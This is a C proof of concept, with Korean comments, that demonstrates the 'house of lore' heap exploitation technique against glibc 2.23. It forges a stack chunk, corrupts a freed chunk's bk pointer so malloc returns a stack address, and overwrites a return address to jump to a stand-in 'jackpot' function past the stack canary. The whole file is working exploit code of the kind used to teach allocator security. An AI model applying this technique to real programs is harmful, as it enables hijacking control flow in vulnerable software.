#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

void jackpot(){ puts("Nice jump d00d"); exit(0); }

int main(int argc, char * argv[]){


  intptr_t* fake_chunk[4] = {0};
  intptr_t* bypass_buf[3] = {0};

  printf("This is tested against Ubuntu 14.04.4 - 64bit - glibc-2.23\n\n");

  intptr_t *victim = malloc(200);    // smallbins
  printf("Allocating the victim chunk : %p\n\n", victim);
  

  printf("fake_chunk at %p\n", (void*)fake_chunk);
  printf("bypass_buf at %p\n\n", (void*)bypass_buf);

  printf("=== fake_chunk setting ===\n");
  printf("Set the fwd pointer to the victim's mchunkptr in order to bypass the check of smallbin bk check\n");
  printf("Set fake_chunk->bk == bypass_buf AND bypass_buf->fd == fake_chunk\n\n");
  // fake_chunk가 반환될 때, fake_chunk->bk->fd == fake_chunk인지 검사하기 때문.
  fake_chunk[0] = 0;
  fake_chunk[1] = 0;
  fake_chunk[2] = victim-2;  // victim's mchunkptr
  fake_chunk[3] = (intptr_t*)bypass_buf;  
  bypass_buf[2] = (intptr_t*)fake_chunk;
  
  printf("Allocating another large chunk in order to avoid consolidating the top chunk with"
         "the small one during the free()\n");
  void *top_guard = malloc(1000);
  printf("Allocated the large chunk on the heap at %p\n", top_guard);


  printf("\n\nFreeing victim : %p, it will be inserted in the ******* UNSORTED BIN *******\n\n", victim);
  free((void*)victim);

  printf("\nBecause victim is in the smallbin, victim's fwd and bk pointers are NOT nil\n");
  printf("victim->fwd: %p\n", (void *)victim[0]);
  printf("victim->bk: %p\n\n", (void *)victim[1]);

  printf("malloc(large)로 unsortedbin->smallbin으로 옮기거나, fake_chunk->size를 설정해주어야 한다.\n");
  // printf("=== Case 1 ===\n")
  // printf("Now performing a malloc(large)\n");
  // printf("victim : %p will be inserted in front of the smallbin\n", victim);
  // void *mov_to_smallbin = malloc(1200);
  // printf("victim은 smallbin으로 옮겨졌으므로 fd / bk는 smallbin에 link된다.\n");
  
  /* malloc(large) 안하면, unsorted bin에 있는 victim이 smallbin으로 옮겨지지 않는다.
  따라서 victim_2 = malloc(200); 하면서 unsorted bin size check에 걸린다.
  check를 통과하기 위해서는 fake chunk's size를 채워줘야 한다.*/
  printf("=== Case 2 === \n");
  printf("Set fake_chunk->size\n");
  fake_chunk[1] = (intptr_t*)0xd1;
  printf("victim은 unsorted bin에 남아있는 상태다.\n");
  
  printf("victim->fd: %p\n", (void *)victim[0]);
  printf("victim->bk: %p\n\n", (void *)victim[1]);

  //------------VULNERABILITY-----------

  printf("victim->bk 값을 fake_chunk : %p 로 변경한다\n", fake_chunk);
  victim[1] = (intptr_t)fake_chunk;

  //------------------------------------

  void *victim_2 = malloc(200);  // return victim chunk and link fake chunk to smallbin
  printf("그 다음 첫 번째 malloc(small)는 victim을 반환한다. : %p\n", victim_2);
  
  char *fake_2 = malloc(200);  // return fake chunk
  printf("그 다음 두 번째 malloc(small)는 fake_chunk+2*sizeof(void*)를 반환한다. : %p\n", fake_2);

  printf("\nThe fwd pointer of bypass_buf has changed after the last malloc to %p\n",
         bypass_buf[2]);

  intptr_t sc = (intptr_t)jackpot; // Emulating our in-memory shellcode
  memcpy((fake_2+40), &sc, 8); // This bypasses stack-smash detection since it jumps over the canary
}


